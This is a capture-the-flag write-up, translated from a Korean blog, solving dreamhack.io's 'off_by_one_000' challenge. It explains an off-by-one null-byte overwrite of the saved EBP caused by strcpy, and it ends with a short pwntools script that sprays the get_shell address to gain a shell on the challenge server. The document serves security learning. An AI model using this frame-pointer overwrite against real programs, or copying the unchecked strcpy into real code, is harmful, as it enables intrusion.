# dreamhack.io: off_by_one_000

> Originally published on [Naver Blog](https://blog.naver.com/chaeeunhur630/224314758417). Translated and reformatted in English.

[*] '/Users/chaeeun/Desktop/56d3fdd7-0e11-4aee-b139-a0f1a8d967c4/off_by_one_000'
 Arch: i386-32-little
 RELRO: Partial RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: No PIE (0x8048000)
 Stripped: No
chaeeun@chaeeuns-MacBook-Air 56d3fdd7-0e11-4aee-b139-a0f1a8d967c4 % cat off_by_one_000.c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char cp_name[256];

void get_shell()
{
 system("/bin/sh");
}

void alarm_handler()
{
 puts("TIME OUT");
 exit(-1);
}

void initialize()
{
 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);

 signal(SIGALRM, alarm_handler);
 alarm(30);
}

int cpy()
{
 char real_name[256];
 strcpy(real_name, cp_name);
 return 0;
}

int main()
{
 initialize();
 printf("Name: ");
 read(0, cp_name, sizeof(cp_name));

 cpy();

 printf("Name: %s", cp_name);

 return 0;
}

NX and Partial RELRO are enabled. The behavior of `strcpy()` is important because it copies bytes through the terminating null byte without checking the destination size.

strcpy() is a function that copies strings in C language.

#include <string.h>
char *strcpy(char *dest, const char *src);

Meaning:
Copy the src string to the dest buffer

Why it's dangerous from a security perspective

strcpy() does not check dest buffer size.
For example:
char buf[8];
strcpy(buf, "AAAAAAAAAAAAAAAAAAAAA");

buf is 8 bytes, but the string to copy is much longer.
Then, the stack area behind buf is also covered.

buf[8]
saved rbp
return address

In this structure, if strcpy() continues to copy without checking the length, a stack buffer overflow may occur.

Key conditions of strcpy(). strcpy() is dangerous if the following conditions are true:

1. Destination buffer size is small
2. The attacker can control the length of the string to be copied.
3. No length checking

strcpy and null byte

strcpy() copies until it encounters \0. So, if there is a null byte in the middle of the source string, copying stops there.

Is it also a buffer overflow? For reference, %s must have \0 at the end of the string to stop properly. This is probably an off-by-one null byte overwrite problem. Why does this happen?

sizeof(cp_name) is 256, and read() does not automatically add \0 to the end of the string. So for example if we put 256 A's:

cp_name = AAAAAAAAAA...AAAA and there is no \0 at the end.

For now

(gdb) p get_shell

$2 = {<text variable, no debug info>} 0x80485db <get_shell>

In 32-bit i386, the stack looks roughly like this.

real_name[256]

saved EBP

return address

Immediately after real_name there is usually a saved EBP.

Frame pointer overflow is a technique that changes the execution flow by overwriting the saved frame pointer, or saved EBP in 32-bit, rather than directly covering the return address. Because off-by-one only overflows 1 byte, it cannot reach the return address. real_name is 256 bytes, and strcpy() copies up to the last \0 and writes the 257th byte.

So what is directly covered is not the return address: it is the lower 1 byte of the saved EBP.

from pwn import * 

p = remote('host8.dreamhack.games', 15546)
adr = 0x80485db

payload = p32(adr)*64

p.recvuntil('Name: ')
p.send(payload)

p.interactive()

For reference, why is it 64 here?

4 bytes * 0x40

= 4 * 64

= 256 bytes

It is.
